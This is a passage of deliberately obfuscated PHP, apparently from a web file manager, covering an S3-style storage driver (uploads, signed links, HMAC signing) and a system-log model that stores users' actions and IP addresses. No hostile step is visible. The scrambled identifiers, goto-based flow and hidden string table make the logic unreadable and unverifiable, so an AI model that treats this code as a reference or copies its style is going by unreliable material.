$this->client->putObject($Cù¦›ŠÀÈä, $this->bucket, $BĞ¥Âîïèã, $DîôšÇº’[192], array(), $DÈ³Ö¹êÜ); if (!$f›ÓâÏ¾ã) { return !1; } if ($fÍÚÙ ¶ê) { return !0; } goto e‡´¹Ù‚; f——İÁÖĞÆ: } public function fileSubstr($A ¥¤Ö¬ê‹, $fÛÀë„›Áğ, $F©øßÎîö) { $f„Ç¿ÏÁ¬ê = $fÛÀë„›Áğ + $F©øßÎîö - 1; return $this->client->getObject($this->bucket, $A ¥¤Ö¬ê‹, array($_SERVER[«¾°Ã¤][210] => "\x62\x79\x74\145\163\75{$fÛÀë„›Áğ}\55{$f„Ç¿ÏÁ¬ê}")); } public function upload($BÆŠ‰¹êî, $d¢ì¸ï¿½, $FÛ«Âˆ¾”° = false, $Cç”ëÄó½ = REPEAT_REPLACE) { $eŞ²ƒ»Ïğ… =& $_SERVER[«¾°Ã¤]; $E£Ÿ¦£â = array($eŞ²ƒ»Ïğ…[208] => @md5_file($d¢ì¸ï¿½)); $eÒ“º‚ËÆ„ = array($eŞ²ƒ»Ïğ…[211] => get_file_mime(get_path_ext($BÆŠ‰¹êî))); if (IO::size($d¢ì¸ï¿½) <= 1024 * 1024 * 200) { $aìàŠïïç = $this->client->putObjectFile($d¢ì¸ï¿½, $this->bucket, $BÆŠ‰¹êî, $eŞ²ƒ»Ïğ…[192], $E£Ÿ¦£â, $eÒ“º‚ËÆ„); return !empty($aìàŠïïç) ? $this->getPathOuter($BÆŠ‰¹êî) : !1; } $A°¸Ë…İø = $this->client->multiUploadObject($d¢ì¸ï¿½, $this->bucket, trim($BÆŠ‰¹êî, $eŞ²ƒ»Ïğ…[8]), $E£Ÿ¦£â, $eÒ“º‚ËÆ„); return $A°¸Ë…İø ? $this->getPathOuter($BÆŠ‰¹êî) : !1; } public function download($d–îÕ¤¯²î, $A“‹âå‡Ó’) { if (!@is_dir($this->pathFather($A“‹âå‡Ó’)) && !IO::mkdir($this->pathFather($A“‹âå‡Ó’))) { return !1; } $Bã…ˆ‚àßï = $this->client->getObject($this->bucket, $d–îÕ¤¯²î, array(), $A“‹âå‡Ó’); return $Bã…ˆ‚àßï !== !1 ? $A“‹âå‡Ó’ : !1; } public function link($B±±¶îùí, $Aä‹âœŠÑ¹ = array()) { $e»Š˜á†ä‘ =& $_SERVER[«¾°Ã¤]; if ($this->signVer == $e»Š˜á†ä‘[212]) { return $this->client->getAuthenticatedURL($this->bucket, $B±±¶îùí, 3600 * 12, $Aä‹âœŠÑ¹); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($B±±¶îùí, $e»Š˜á†ä‘[8]), 3600 * 12, $this->region, array(), !0, $Aä‹âœŠÑ¹); } public function fileOut($fœõ›ç¶Ì¢, $e¡Ù„ŒÜ’Ï = false, $EäÛâå„Çù = false, $a‰Ğİğ§‡ = '') { goto a—ˆÊÎªïá; eé‹¹µÁá¦: $fÕÙùòˆË = get_file_mime(get_path_ext($EäÛâå„Çù)); if ($fÕÙùòˆË == $e¡åğ•ƒÇâ[213]) { return parent::fileOut($fœõ›ç¶Ì¢, $e¡Ù„ŒÜ’Ï, $EäÛâå„Çù, $a‰Ğİğ§‡); } $e¡Ù„ŒÜ’Ï = $e¡Ù„ŒÜ’Ï ? $e¡åğ•ƒÇâ[214] : $e¡åğ•ƒÇâ[215]; goto DßÌ“×‡é; DßÌ“×‡é: $FäùŒÉ¸éß = array($e¡åğ•ƒÇâ[216] => $e¡Ù„ŒÜ’Ï . $e¡åğ•ƒÇâ[217] . rawurlencode($EäÛâå„Çù), $e¡åğ•ƒÇâ[218] => $fÕÙùòˆË); $DÛÊÃ±š°ä = $this->link($fœõ›ç¶Ì¢, $FäùŒÉ¸éß); $this->fileOutLink($DÛÊÃ±š°ä); goto c¦öµ©å‡„; a—ˆÊÎªïá: $e¡åğ•ƒÇâ =& $_SERVER[«¾°Ã¤]; if ($this->isFileOutServer()) { return $this->fileOutServer($fœõ›ç¶Ì¢, $e¡Ù„ŒÜ’Ï, $EäÛâå„Çù, $a‰Ğİğ§‡); } if (!$EäÛâå„Çù) { $EäÛâå„Çù = $this->pathThis($fœõ›ç¶Ì¢); } goto eé‹¹µÁá¦; c¦öµ©å‡„: } public function fileOutServer($aé‡†ˆî›º, $D•Ôø¬Òˆ¬ = false, $D…¢ß¿—•’ = false, $C­¨ÍÒÍ … = '') { parent::fileOut($aé‡†ˆî›º, $D•Ôø¬Òˆ¬, $D…¢ß¿—•’, $C­¨ÍÒÍ …); } public function fileOutImageServer($B·‚èŒŸŸ™, $c¹Õ´ë³Ûö = 250) { parent::fileOutImage($B·‚èŒŸŸ™, $c¹Õ´ë³Ûö); } public function hashMd5($BŒ…‰Ò¼Úí, $fä ËŠÓô¯ = '') { $eš©È­ =& $_SERVER[«¾°Ã¤]; $b¡œ÷Ø÷ = $this->objectMeta($BŒ…‰Ò¼Úí); if (!$b¡œ÷Ø÷) { return !1; } $fä ËŠÓô¯ = $fä ËŠÓô¯ ? $fä ËŠÓô¯ : _get($b¡œ÷Ø÷, $eš©È­[219]); $fä ËŠÓô¯ = $fä ËŠÓô¯ ? $fä ËŠÓô¯ : _get($b¡œ÷Ø÷, $eš©È­[209], $eš©È­[33]); return $fä ËŠÓô¯; } public function uploadFormData($BëĞ¯í—ß, $Eç“äæø† = 3600) { $E‡Åò–²ğ =& $_SERVER[«¾°Ã¤]; $cÍ†îó•ñË = $this->pathFather($BëĞ¯í—ß); $eá¾ò›Œ = $this->client->getHttpUploadPostParams($this->bucket, $cÍ†îó•ñË, $E‡Åò–²ğ[192], $Eç“äæø†); return array_merge((array) $eá¾ò›Œ, array($E‡Åò–²ğ[175] => $this->getHost())); } public function multiUploadFormData($B¾ÇÖğÌî, $Fó›ôÅêåà = 3600) { $a¿¼Â‰à–‹ =& $_SERVER[«¾°Ã¤]; $aîª‰‘…Ş† = gmdate($a¿¼Â‰à–‹[220]); $b£ÌĞÑŒ… = array(); $føœ”¹£­ = $this->client->getUploadId($this->bucket, $B¾ÇÖğÌî, $b£ÌĞÑŒ…); if (!$føœ”¹£­) { return !1; } return array($a¿¼Â‰à–‹[221] => $føœ”¹£­, $a¿¼Â‰à–‹[175] => $this->getHost() . $a¿¼Â‰à–‹[8] . $this->pathEncode($B¾ÇÖğÌî), $a¿¼Â‰à–‹[222] => $aîª‰‘…Ş†, $a¿¼Â‰à–‹[93] => $B¾ÇÖğÌî); } public function multiUploadAuthData($F¸ÑÀ¯, $FÔŞäÔŒáÉ = array()) { goto EĞÓƒã–Ø; bóáÈ×Ç¡Ü: $B¡ÙÓĞÍ¾£ = $FÔŞäÔŒáÉ[$b¯È¨®¡®ë[93]]; unset($FÔŞäÔŒáÉ[$b¯È¨®¡®ë[93]]); if (isset($FÔŞäÔŒáÉ[$b¯È¨®¡®ë[223]])) { $FÔŞäÔŒáÉ[$b¯È¨®¡®ë[222]] = $b™¼ğƒ‚š; return $this->listUploadParts($B¡ÙÓĞÍ¾£, $FÔŞäÔŒáÉ); } goto f©¿Ñ¤ä²ö; b‘¥ñÎ‰½´: if (strpos($AÒ½»Á‡æ—, $b¯È¨®¡®ë[225]) === 0) { return array($b¯È¨®¡®ë[232] => $dÖ×”«¦¬, $b¯È¨®¡®ë[222] => $b™¼ğƒ‚š); } return $dÖ×”«¦¬; goto BŞ®ÑŸŠœ; e»«ˆÆÂíä: $c½¤‘¸†  = implode($b¯È¨®¡®ë[229], $e‚Í­Ò½­º); $BÆ”ÛùâÂÄ = base64_encode(hash_hmac($b¯È¨®¡®ë[230], $c½¤‘¸† , $this->secret, !0)); $dÖ×”«¦¬ = $b¯È¨®¡®ë[231] . $this->accessKey . $b¯È¨®¡®ë[4] . $BÆ”ÛùâÂÄ; goto b‘¥ñÎ‰½´; f©¿Ñ¤ä²ö: $e‚Í­Ò½­º = array($b¯È¨®¡®ë[224], $b¯È¨®¡®ë[33], $b¯È¨®¡®ë[119], $b¯È¨®¡®ë[33], "\170\55\x61\x6d\172\x2d\x64\141\164\x65\x3a{$b™¼ğƒ‚š}", $b¯È¨®¡®ë[8] . $this->bucket . $b¯È¨®¡®ë[8] . $this->pathEncode($B¡ÙÓĞÍ¾£) . $AÒ½»Á‡æ—); if (strpos($AÒ½»Á‡æ—, $b¯È¨®¡®ë[225]) === 0) { $e‚Í­Ò½­º[0] = $b¯È¨®¡®ë[226]; } if (isset($FÔŞäÔŒáÉ[$b¯È¨®¡®ë[227]]) && $FÔŞäÔŒáÉ[$b¯È¨®¡®ë[227]] == $b¯È¨®¡®ë[228]) { $e‚Í­Ò½­º[0] = $b¯È¨®¡®ë[228]; } goto e»«ˆÆÂíä; EĞÓƒã–Ø: $b¯È¨®¡®ë =& $_SERVER[«¾°Ã¤]; $b™¼ğƒ‚š = isset($FÔŞäÔŒáÉ[$b¯È¨®¡®ë[222]]) ? $FÔŞäÔŒáÉ[$b¯È¨®¡®ë[222]] : gmdate($b¯È¨®¡®ë[220]); $AÒ½»Á‡æ— = isset($FÔŞäÔŒáÉ[$b¯È¨®¡®ë[168]]) ? $FÔŞäÔŒáÉ[$b¯È¨®¡®ë[168]] : $b¯È¨®¡®ë[33]; goto bóáÈ×Ç¡Ü; BŞ®ÑŸŠœ: } public function listUploadParts($F‡¿¨–Ñ«, $e£Á®Ô‰ğÏ = array()) { goto FßñŸŞ·©¢; A’ö‚ŠÇæØ: if (!$C„ôÂ¿ƒï) { return !1; } unset($e£Á®Ô‰ğÏ[$EºíàÖÜ§É[223]], $e£Á®Ô‰ğÏ[$EºíàÖÜ§É[227]]); $e£Á®Ô‰ğÏ[$EºíàÖÜ§É[93]] = $F‡¿¨–Ñ«; goto fåñ–¬©ó­; FßñŸŞ·©¢: $EºíàÖÜ§É =& $_SERVER[«¾°Ã¤]; $fÆêÏ«õÉì = str_replace($EºíàÖÜ§É[233], $EºíàÖÜ§É[33], $e£Á®Ô‰ğÏ[$EºíàÖÜ§É[168]]); $C„ôÂ¿ƒï = $this->client->listParts($this->bucket, $F‡¿¨–Ñ«, $fÆêÏ«õÉì); goto A’ö‚ŠÇæØ; fåñ–¬©ó­: $Aœè†·”°º = $this->multiUploadAuthData($F‡¿¨–Ñ«, $e£Á®Ô‰ğÏ); if (empty($Aœè†·”°º)) { return !1; } return array($EºíàÖÜ§É[232] => $Aœè†·”°º, $EºíàÖÜ§É[222] => $e£Á®Ô‰ğÏ[$EºíàÖÜ§É[222]], $EºíàÖÜ§É[234] => $C„ôÂ¿ƒï); goto cê½ç§íÆ™; cê½ç§íÆ™: } public function getHost() { return parent::getHost() . $_SERVER[«¾°Ã¤][8] . $this->bucket; } public function size($AŒÌã¯‘Šä) { $EÅ’ñ‘Ñ = $this->objectMeta($AŒÌã¯‘Šä); return $EÅ’ñ‘Ñ ? $EÅ’ñ‘Ñ[$_SERVER[«¾°Ã¤][78]] : 0; } public function info($b·…‘ëî–) { if ($this->isFolder($b·…‘ëî–)) { return $this->folderInfo($b·…‘ëî–); } else { if ($this->isFile($b·…‘ëî–)) { return $this->fileInfo($b·…‘ëî–); } } return !1; } public function exist($d’‰»‘ê†Ú) { return $this->isFile($d’‰»‘ê†Ú) || $this->isFolder($d’‰»‘ê†Ú); } public function isFile($cÂŒï»¨‹´) { return !$this->isFolder($cÂŒï»¨‹´) && $this->objectMeta($cÂŒï»¨‹´); } public function isFolder($A„‚Ø¶Òàî) { return $this->cacheMethod($_SERVER[«¾°Ã¤][199], $A„‚Ø¶Òàî); } protected function objectMeta($d°Ô¤®ò) { return $this->cacheMethod($_SERVER[«¾°Ã¤][200], $d°Ô¤®ò); } protected function _objectMeta($bà›†£ËˆÎ) { $f Úï¸‹ø‚ =& $_SERVER[«¾°Ã¤]; $bà›†£ËˆÎ = rtrim($bà›†£ËˆÎ, $f Úï¸‹ø‚[8]); try { $Fœ•í•äá = $this->client->getObjectInfo($this->bucket, $bà›†£ËˆÎ); if (!isset($Fœ•í•äá[$f Úï¸‹ø‚[219]]) && isset($Fœ•í•äá[$f Úï¸‹ø‚[235]])) { $Fœ•í•äá[$f Úï¸‹ø‚[219]] = $Fœ•í•äá[$f Úï¸‹ø‚[235]]; } } catch (Exception $fàø›™çĞä) { $Fœ•í•äá = !1; } if (!$Fœ•í•äá) { } return $Fœ•í•äá; } protected function _isFolder($c¼ï¢¼Ë©) { goto aÎ®šŒ‡°à; D¬¼™ù¾÷‡: return !0; goto AáÃ•òŸßù; dÇ Ç¥Ø²Î: $BªÓ±® éß = $this->client->getBucket($this->bucket, $c¼ï¢¼Ë©, null, 1); if (empty($BªÓ±® éß[$f¾ÜÓ«ÓÔˆ[198]])) { return !1; } $f¬ù³´ˆ = $BªÓ±® éß[$f¾ÜÓ«ÓÔˆ[198]][0][$f¾ÜÓ«ÓÔˆ[28]]; goto f³Û¿ÀéÚº; aÎ®šŒ‡°à: $f¾ÜÓ«ÓÔˆ =& $_SERVER[«¾°Ã¤]; $c¼ï¢¼Ë© = rtrim($c¼ï¢¼Ë©, $f¾ÜÓ«ÓÔˆ[8]); if ($c¼ï¢¼Ë© == $f¾ÜÓ«ÓÔˆ[33] || $c¼ï¢¼Ë© == $f¾ÜÓ«ÓÔˆ[8]) { return !0; } goto dÇ Ç¥Ø²Î; f³Û¿ÀéÚº: return stripos($f¬ù³´ˆ, $c¼ï¢¼Ë© . $f¾ÜÓ«ÓÔˆ[8]) === 0 ? !0 : !1; if (substr($f¬ù³´ˆ, -1) == $f¾ÜÓ«ÓÔˆ[8]) { return !0; } if (get_path_this($f¬ù³´ˆ) == get_path_this($c¼ï¢¼Ë©)) { return !1; } goto D¬¼™ù¾÷‡; AáÃ•òŸßù: } } define($_SERVER[«¾°Ã¤][236], 1); goto CŠ¸íà„¡; aë†£ôİ±é: class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\163\164\145\155\x5f\154\x6f\x67"; protected $dataAuto = array(array("\143\162\x65\x61\164\145\x54\151\155\x65", "\164\x69\x6d\145", "\151\156\163\145\162\x74", "\146\x75\x6e\x63\164\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $f˜Ú¦¥¦Ö =& $_SERVER[«¾°Ã¤]; return array($f˜Ú¦¥¦Ö[2005] => LNG($f˜Ú¦¥¦Ö[2006]), $f˜Ú¦¥¦Ö[2007] => LNG($f˜Ú¦¥¦Ö[2008]), $f˜Ú¦¥¦Ö[1633] => LNG($f˜Ú¦¥¦Ö[2009]), $f˜Ú¦¥¦Ö[2010] => LNG($f˜Ú¦¥¦Ö[2011]), $f˜Ú¦¥¦Ö[2012] => LNG($f˜Ú¦¥¦Ö[2013]), $f˜Ú¦¥¦Ö[2014] => LNG($f˜Ú¦¥¦Ö[2015]), $f˜Ú¦¥¦Ö[2016] => LNG($f˜Ú¦¥¦Ö[2017]), $f˜Ú¦¥¦Ö[1663] => LNG($f˜Ú¦¥¦Ö[2017]), $f˜Ú¦¥¦Ö[1664] => LNG($f˜Ú¦¥¦Ö[2018]), $f˜Ú¦¥¦Ö[2019] => LNG($f˜Ú¦¥¦Ö[2020]), $f˜Ú¦¥¦Ö[2021] => LNG($f˜Ú¦¥¦Ö[2022]), $f˜Ú¦¥¦Ö[2023] => LNG($f˜Ú¦¥¦Ö[2024]), $f˜Ú¦¥¦Ö[2025] => LNG($f˜Ú¦¥¦Ö[2026]), $f˜Ú¦¥¦Ö[1661] => LNG($f˜Ú¦¥¦Ö[2027]), $f˜Ú¦¥¦Ö[2028] => LNG($f˜Ú¦¥¦Ö[2029]), $f˜Ú¦¥¦Ö[1668] => LNG($f˜Ú¦¥¦Ö[2030]), $f˜Ú¦¥¦Ö[2031] => LNG($f˜Ú¦¥¦Ö[2032]), $f˜Ú¦¥¦Ö[2033] => LNG($f˜Ú¦¥¦Ö[2034]), $f˜Ú¦¥¦Ö[2035] => LNG($f˜Ú¦¥¦Ö[2036]), $f˜Ú¦¥¦Ö[2037] => LNG($f˜Ú¦¥¦Ö[2038]), $f˜Ú¦¥¦Ö[1671] => LNG($f˜Ú¦¥¦Ö[2039]), $f˜Ú¦¥¦Ö[1672] => LNG($f˜Ú¦¥¦Ö[2040]), $f˜Ú¦¥¦Ö[2041] => LNG($f˜Ú¦¥¦Ö[2042]), $f˜Ú¦¥¦Ö[2043] => LNG($f˜Ú¦¥¦Ö[2044]), $f˜Ú¦¥¦Ö[2045] => LNG($f˜Ú¦¥¦Ö[2046]), $f˜Ú¦¥¦Ö[1666] => LNG($f˜Ú¦¥¦Ö[2047]), $f˜Ú¦¥¦Ö[2048] => LNG($f˜Ú¦¥¦Ö[2049]), $f˜Ú¦¥¦Ö[1665] => LNG($f˜Ú¦¥¦Ö[2050]), $f˜Ú¦¥¦Ö[2051] => LNG($f˜Ú¦¥¦Ö[2052]), $f˜Ú¦¥¦Ö[2053] => LNG($f˜Ú¦¥¦Ö[2054]), $f˜Ú¦¥¦Ö[2055] => LNG($f˜Ú¦¥¦Ö[2056]), $f˜Ú¦¥¦Ö[2057] => LNG($f˜Ú¦¥¦Ö[2057]), $f˜Ú¦¥¦Ö[2058] => LNG($f˜Ú¦¥¦Ö[1637]), $f˜Ú¦¥¦Ö[2059] => LNG($f˜Ú¦¥¦Ö[2060]), $f˜Ú¦¥¦Ö[2061] => LNG($f˜Ú¦¥¦Ö[2062]), $f˜Ú¦¥¦Ö[2063] => LNG($f˜Ú¦¥¦Ö[2064]), $f˜Ú¦¥¦Ö[2065] => LNG($f˜Ú¦¥¦Ö[2066]), $f˜Ú¦¥¦Ö[2067] => LNG($f˜Ú¦¥¦Ö[2068]), $f˜Ú¦¥¦Ö[2069] => LNG($f˜Ú¦¥¦Ö[2069]), $f˜Ú¦¥¦Ö[2070] => LNG($f˜Ú¦¥¦Ö[2071]), $f˜Ú¦¥¦Ö[2072] => LNG($f˜Ú¦¥¦Ö[2073]), $f˜Ú¦¥¦Ö[2074] => LNG($f˜Ú¦¥¦Ö[2075]), $f˜Ú¦¥¦Ö[2076] => LNG($f˜Ú¦¥¦Ö[2077]), $f˜Ú¦¥¦Ö[2078] => LNG($f˜Ú¦¥¦Ö[2079]), $f˜Ú¦¥¦Ö[2080] => LNG($f˜Ú¦¥¦Ö[2081])); } private function typeFile() { $D´¯©Š±” =& $_SERVER[«¾°Ã¤]; $B†Á¼“Æäº = array($D´¯©Š±”[1668] => array($D´¯©Š±”[1669]), $D´¯©Š±”[2023] => array($D´¯©Š±”[2082]), $D´¯©Š±”[2025] => array($D´¯©Š±”[2083]), $D´¯©Š±”[1661] => array($D´¯©Š±”[1662]), $D´¯©Š±”[2033] => array(), $D´¯©Š±”[2035] => array(), $D´¯©Š±”[2037] => array(), $D´¯©Š±”[1671] => array($D´¯©Š±”[1673]), $D´¯©Š±”[1672] => array($D´¯©Š±”[1673]), $D´¯©Š±”[2041] => array($D´¯©Š±”[2084]), $D´¯©Š±”[2043] => array($D´¯©Š±”[2084]), $D´¯©Š±”[2045] => array($D´¯©Š±”[2085]), $D´¯©Š±”[2031] => array($D´¯©Š±”[2086]), $D´¯©Š±”[1666] => array($D´¯©Š±”[2087]), $D´¯©Š±”[2048] => array($D´¯©Š±”[2088]), $D´¯©Š±”[1665] => array($D´¯©Š±”[1667])); return $B†Á¼“Æäº; } private function typeAll() { goto e¢Çî¢ªéÆ; b¼Ä´Ùôğ: return $eÀâ¯×àß¥; goto DÃºÚ¿¦Áˆ; e¢Çî¢ªéÆ: $a½º·£ñŒÈ =& $_SERVER[«¾°Ã¤]; $eÀâ¯×àß¥ = $this->typeList; $Fë¤—‚•ó÷ = array_filter($this->typeFile()); goto D••¯Éº¿¨; D••¯Éº¿¨: foreach ($Fë¤—‚•ó÷ as $A‹‹îÎòĞš => $C½øªöÉ‡) { $eÀâ¯×àß¥[$C½øªöÉ‡[0]] = $eÀâ¯×àß¥[$A‹‹îÎòĞš]; } $eÀâ¯×àß¥[$a½º·£ñŒÈ[1673]] = LNG($a½º·£ñŒÈ[2089]); $eÀâ¯×àß¥[$a½º·£ñŒÈ[2084]] = LNG($a½º·£ñŒÈ[2090]); goto b¼Ä´Ùôğ; DÃºÚ¿¦Áˆ: } public function addLog($eŒ£ñÙñâ‰, $B««Â±ÌÃ‘ = array()) { goto E©î¬Ö‹İÎ; Eê¼‹—ëÃ‘: $B««Â±ÌÃ‘ = array($Bùğˆè¤à«[1520] => Session::sign(), $Bùğˆè¤à«[1521] => $bÛå¸Ù¨“—, $Bùğˆè¤à«[29] => $eŒ£ñÙñâ‰, $Bùğˆè¤à«[1523] => json_encode($B««Â±ÌÃ‘)); parent::add($B««Â±ÌÃ‘); goto Dôù¡¿²; FÑÈä•õŸÒ: if (!$bÛå¸Ù¨“—) { $bÛå¸Ù¨“— = (int) Session::get($Bùğˆè¤à«[1819]); } $eöŞœÙä…ä = get_client_ip(); if (!$B««Â±ÌÃ‘ || strlen(json_encode($B««Â±ÌÃ‘)) >= 1024) { $B««Â±ÌÃ‘ = array($Bùğˆè¤à«[2091] => $eöŞœÙä…ä); } else { if (is_array($B««Â±ÌÃ‘)) { $B««Â±ÌÃ‘[$Bùğˆè¤à«[2091]] = $eöŞœÙä…ä; } else { $B««Â±ÌÃ‘ = array($Bùğˆè¤à«[1089] => $B««Â±ÌÃ‘, $Bùğˆè¤à«[2091] => $eöŞœÙä…ä); } } goto Eê¼‹—ëÃ‘; E©î¬Ö‹İÎ: $Bùğˆè¤à« =& $_SERVER[«¾°Ã¤]; if (!isset($this->typeList[$eŒ£ñÙñâ‰])) { return; } $bÛå¸Ù¨“— = defined($Bùğˆè¤à«[463]) && USER_ID ? USER_ID : (isset($B««Â±ÌÃ‘[$Bùğˆè¤à«[1529]]) ? $B««Â±ÌÃ‘[$Bùğˆè¤à«[1529]] : 0); goto FÑÈä•õŸÒ; Dôù¡¿²: } public function remove($AÕÈçÉ¿ß) { $this->where(array($_SERVER[«¾°Ã¤][421] => $AÕÈçÉ¿ß))->delete(); } private function _makeOrder($bÏˆó–´ªö = '') { goto eœİùöËí¿; c°Ø¹õ±¹â: return $this->order($bÏˆó–´ªö); goto DÌå­¥ÀİŠ; eœİùöËí¿: $cÈİ‘‰í¹ø =& $_SERVER[«¾°Ã¤]; $a¸‰ã¬‘ó = $cÈİ‘‰í¹ø[194]; $DïÑ—ô»•Û = array($cÈİ‘‰í¹ø[437] => $cÈİ‘‰í¹ø[438], $cÈİ‘‰í¹ø[439] => $cÈİ‘‰í¹ø[440]); goto f æŒ§Ë¸; f æŒ§Ë¸: $A–‡—À§õÒ = Input::get($cÈİ‘‰í¹ø[445], $cÈİ‘‰í¹ø[7], $cÈİ‘‰í¹ø[1851], array($cÈİ‘‰í¹ø[1775], $cÈİ‘‰í¹ø[439])); $A–‡—À§õÒ = $DïÑ—ô»•Û[$A–‡—À§õÒ]; $bÏˆó–´ªö = $bÏˆó–´ªö . "{$a¸‰ã¬‘ó}\40{$A–‡—À§õÒ}"; goto c°Ø¹õ±¹â; DÌå­¥ÀİŠ: } public function get($E–öÓ¿‘«Ì = '') { goto d£»Ö±ø³; EÒ‹¸¬Ëè: $fÑî¶[$bŞ—ŸÒŞ‰¡[367]] = $this->logList($fÑî¶[$bŞ—ŸÒŞ‰¡[367]]); return $fÑî¶; goto a®ÄÉÚß¡; dŞ‹ó’ò‹: if ($E–öÓ¿‘«Ì[$bŞ—ŸÒŞ‰¡[1529]]) { $Dæ¾–‹•Å[$bŞ—ŸÒŞ‰¡[1529]] = $E–öÓ¿‘«Ì[$bŞ—ŸÒŞ‰¡[1529]]; } if (isset($E–öÓ¿‘«Ì[$bŞ—ŸÒŞ‰¡[730]])) { $f‹ÅƒÀ•ÂÊ = $E–öÓ¿‘«Ì[$bŞ—ŸÒŞ‰¡[730]]; $Ağ…Ú¬É’ƒ = isset($E–öÓ¿‘«Ì[$bŞ—ŸÒŞ‰¡[485]]) ? $E–öÓ¿‘«Ì[$bŞ—ŸÒŞ‰¡[485]] : time(); $Dæ¾–‹•Å[$bŞ—ŸÒŞ‰¡[194]] = array($bŞ—ŸÒŞ‰¡[331], array($f‹ÅƒÀ•ÂÊ, $Ağ…Ú¬É’ƒ)); } if ($E–öÓ¿‘«Ì[$bŞ—ŸÒŞ‰¡[29]]) { $dŒƒ´ˆ‰ÄÌ = explode($bŞ—ŸÒŞ‰¡[47], $E–öÓ¿‘«Ì[$bŞ—ŸÒŞ‰¡[29]]); $fÂĞ‚¼‹ìô = $this->typeFile(); $f˜ºÓµå = array(); foreach ($dŒƒ´ˆ‰ÄÌ as $Eƒ×é…œåë) { $f˜ºÓµå[] = $Eƒ×é…œåë; if (isset($fÂĞ‚¼‹ìô[$Eƒ×é…œåë])) { $f˜ºÓµå = array_merge($f˜ºÓµå, $fÂĞ‚¼‹ìô[$Eƒ×é…œåë]); } } $f˜ºÓµå = array_unique($f˜ºÓµå); if ($f˜ºÓµå) { $Dæ¾–‹•Å[$bŞ—ŸÒŞ‰¡[29]] = array($bŞ—ŸÒŞ‰¡[7], $f˜ºÓµå); } } else { $Dæ¾–‹•Å[$bŞ—ŸÒŞ‰¡[29]] = array($bŞ—ŸÒŞ‰¡[2092], $bŞ—ŸÒŞ‰¡[2093]); } goto e•‹éçì‹Ï; d£»Ö±ø³: $bŞ—ŸÒŞ‰¡ =& $_SERVER[«¾°Ã¤]; if (!$E–öÓ¿‘«Ì) { show_json(array()); } $Dæ¾–‹•Å = array(); goto dŞ‹ó’ò‹; e•‹éçì‹Ï: if (!empty($E–öÓ¿‘«Ì[$bŞ—ŸÒŞ‰¡[2091]])) { $Dæ¾–‹•Å[$bŞ—ŸÒŞ‰¡[440]] = array($bŞ—ŸÒŞ‰¡[380], "\x25{$E–öÓ¿‘«Ì[$bŞ—ŸÒŞ‰¡[2091]]}\45"); } $fÑî¶ = $this->_makeOrder()->where($Dæ¾–‹•Å)->selectPage(); if (empty($fÑî¶[$bŞ—ŸÒŞ‰¡[367]])) { show_json(array(), !0, $fÑî¶[$bŞ—ŸÒŞ‰¡[364]]); } goto EÒ‹¸¬Ëè; a®ÄÉÚß¡: } private function ipAddress(&$A˜â©–ŒİŞ) { $F›¹¹Ùã†ï =& $_SERVER[«¾°Ã¤]; if (!empty($A˜â©–ŒİŞ[$F›¹¹Ùã†ï[2091]])) { $a§ìœÔšé = IpLocation::get($A˜â©–ŒİŞ[$F›¹¹Ùã†ï[2091]]); } else { $a§ìœÔšé = LNG($F›¹¹Ùã†ï[2094]); } $A˜â©–ŒİŞ[$F›¹¹Ùã†ï[2095]] = $a§ìœÔšé; } private function descZipDownload($d†¹ÖšÂÓå, &$FéÛ¤İßåÂ) { $D—äæ‘åĞÕ =& $_SERVER[«¾°Ã¤]; if (!isset($d†¹ÖšÂÓå[$D—äæ‘åĞÕ[2096]])) { return; } $Aß¨ï¡Ë¨² = json_decode($d†¹ÖšÂÓå[$D—äæ‘åĞÕ[2096]], !0); foreach ($Aß¨ï¡Ë¨² as $cë¢²ÌÖ™è) { try { $d¡¼¡²ŠâÄ = IO::infoFull($cë¢²ÌÖ™è[$D—äæ‘åĞÕ[76]]); } catch (Exception $fÅïÊøó¨É) { continue; } $d†¹ÖšÂÓå[$D—äæ‘åĞÕ[76]] = $cë¢²ÌÖ™è[$D—äæ‘åĞÕ[76]]; $FéÛ¤İßåÂ[] = $d†¹ÖšÂÓå[$D—äæ‘åĞÕ[404]] = $d¡¼¡²ŠâÄ[$D—äæ‘åĞÕ[404]]; $FéÛ¤İßåÂ[] = $d†¹ÖšÂÓå[$D—äæ‘åĞÕ[1907]] = $d¡¼¡²ŠâÄ[$D—äæ‘åĞÕ[487]]; break; } return $d†¹ÖšÂÓå; } private function getSourceList(&$BÖ¯‰œ‘ç™) { $B±Ë’Ìõ…ó =& $_SERVER[«¾°Ã¤]; $Aì‚Á‘éáø = array(); foreach ($BÖ¯‰œ‘ç™ as $Cº®„©®²Ù => $cõ¯¸“µ½) { goto D‹‡ŒÖ…„Ì; D‹‡ŒÖ…„Ì: $b¥Ë¨Ö–’† = json_decode($cõ¯¸“µ½[$B±Ë’Ìõ…ó[440]], !0); if ($cõ¯¸“µ½[$B±Ë’Ìõ…ó[29]] == $B±Ë’Ìõ…ó[1664]) { $b¥Ë¨Ö–’† = $this->descZipDownload($b¥Ë¨Ö–’†, $Aì‚Á‘éáø); $BÖ¯‰œ‘ç™[$Cº®„©®²Ù][$B±Ë’Ìõ…ó[440]] = json_encode($b¥Ë¨Ö–’†); continue; } if (strpos($cõ¯¸“µ½[$B±Ë’Ìõ…ó[29]], $B±Ë’Ìõ…ó[1908]) !== 0) { if (!isset($b¥Ë¨Ö–’†[$B±Ë’Ìõ…ó[76]]) || strpos($cõ¯¸“µ½[$B±Ë’Ìõ…ó[29]], $B±Ë’Ìõ…ó[2097]) !== 0) { continue; } try { $A–çĞ£ ¡® = IO::infoFull($b¥Ë¨Ö–’†[$B±Ë’Ìõ…ó[76]]); } catch (Exception $Dƒùíˆ‚á²) { continue; } $Aì‚Á‘éáø[] = $b¥Ë¨Ö–’†[$B±Ë’Ìõ…ó[404]] = $A–çĞ£ ¡®[$B±Ë’Ìõ…ó[404]]; $Aì‚Á‘éáø[] = $b¥Ë¨Ö–’†[$B±Ë’Ìõ…ó[1907]] = $A–çĞ£ ¡®[$B±Ë’Ìõ…ó[487]]; $BÖ¯‰œ‘ç™[$Cº®„©®²Ù][$B±Ë’Ìõ…ó[440]] = json_encode($b¥Ë¨Ö–’†); continue; } goto cÔ«¾œ›Ö†; cÔ«¾œ›Ö†: $Aì‚Á‘éáø[] = $b¥Ë¨Ö–’†[$B±Ë’Ìõ…ó[404]]; $Aì‚Á‘éáø[] = $b¥Ë¨Ö–’†[$B±Ë’Ìõ…ó[1907]]; 